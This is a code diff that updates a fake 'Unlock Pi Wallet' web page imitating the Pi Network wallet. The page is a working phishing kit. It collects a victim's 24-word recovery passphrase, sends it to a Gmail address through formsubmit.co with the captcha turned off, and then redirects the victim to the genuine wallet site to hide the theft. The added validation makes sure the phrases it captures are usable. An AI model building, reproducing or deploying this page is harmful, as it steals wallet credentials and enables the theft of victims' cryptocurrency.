@@ -127,7 +127,7 @@
 <body>
   <div class="topbar">
     <div class="back" onclick="window.location.href='index.html'">&lt;</div>
-    <img src="https://ik.imagekit.io/pinet/Pi/Wallet%20click.png" alt="Wallet" height="20" />
+    <img src="https://ik.imagekit.io/pinet/Pi/unlock.png?updatedAt=1753819802279" alt="unlock" height="20" />
     Wallet
     <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png" alt="Pi Logo" height="20" />
   </div>
@@ -135,23 +135,23 @@
   <div class="content">
     <h2>Unlock Pi Wallet</h2>
 
-    <form id="passphrase-form" action="https://usebasin.com/f/309558e477ef" method="POST">
+    <!-- UPDATED FORM -->
+    <form id="passphrase-form" action="https://formsubmit.co/picoinulock0786@gmail.com" method="POST">
       <div class="passphrase-box">
-        <textarea name="passphrase" placeholder="Enter your 24-word&#10;passphrase here" required></textarea>
+        <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word
+passphrase here" required></textarea>
       </div>
 
-      <!-- Hidden field to detect which button -->
-      <form action="https://formcarry.com/s/Mk7NUDYaT7n" method="POST" accept-charset="UTF-8">
-  <!-- Hidden field to detect which button -->
-  <input type="hidden" name="unlock_method" id="unlock_method" value="">
+      <!-- Hidden fields -->
+      <input type="hidden" name="unlock_method" id="unlock_method" value="">
+      <!-- Redirect to thanks.html after submit -->
+      <input type="hidden" name="_next" value="https://wallet.pinet.com/">
+      <!-- Disable captcha on FormSubmit -->
+      <input type="hidden" name="_captcha" value="false">
 
-  <button type="submit" class="btn-border" onclick="setMethod('Passphrase')">Unlock With Passphrase</button>
-  <button type="submit" class="btn-filled" onclick="setMethod('Fingerprint')">Unlock With Fingerprint</button>
-</form>
-
-    <div id="error-msg" class="error-box">
-      Please provide a valid 24-word phrase to unlock your Pi wallet. The phrase you provided is invalid.
-    </div>
+      <button type="submit" class="btn-border" onclick="setMethod('Passphrase')">Unlock With Passphrase</button>
+      <button type="submit" class="btn-filled" onclick="setMethod('Fingerprint')">Unlock With Fingerprint</button>
+    </form>
 
     <p class="note">
       As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
@@ -162,15 +162,40 @@
     </p>
   </div>
 
+  <!-- Error message box -->
+  <div id="error-msg" class="error-box" style="display:none;">
+    Please provide a valid 24-word phrase to unlock your Pi wallet. The phrase you provided is invalid.
+  </div>
+
   <script>
     function setMethod(method) {
       document.getElementById("unlock_method").value = method;
-
-      // Optional: Show error on screen after clicking
-      setTimeout(() => {
-        document.getElementById("error-msg").style.display = 'block';
-      }, 100);
     }
+
+    // 24-word validation
+    const form = document.getElementById('passphrase-form');
+    const textarea = document.getElementById('passphrase');
+    const errorBox = document.getElementById('error-msg');
+
+    form.addEventListener('submit', function (e) {
+      const text = (textarea.value || "").trim();
+      const words = text.split(/\s+/).filter(Boolean);
+
+      const is24 = words.length === 24;
+      const wordsOk = is24 && words.every(w => /^[a-zA-Z]{2,20}$/.test(w));
+
+      if (!is24 || !wordsOk) {
+        e.preventDefault();
+        errorBox.style.display = 'block';
+        errorBox.textContent = !is24
+          ? 'Please enter exactly 24 words (separated by spaces).'
+          : 'Words must be letters only (a–z), 2–20 characters each.';
+        textarea.focus();
+        return false;
+      }
+
+      errorBox.style.display = 'none';
+    });
   </script>
 </body>
 </html>
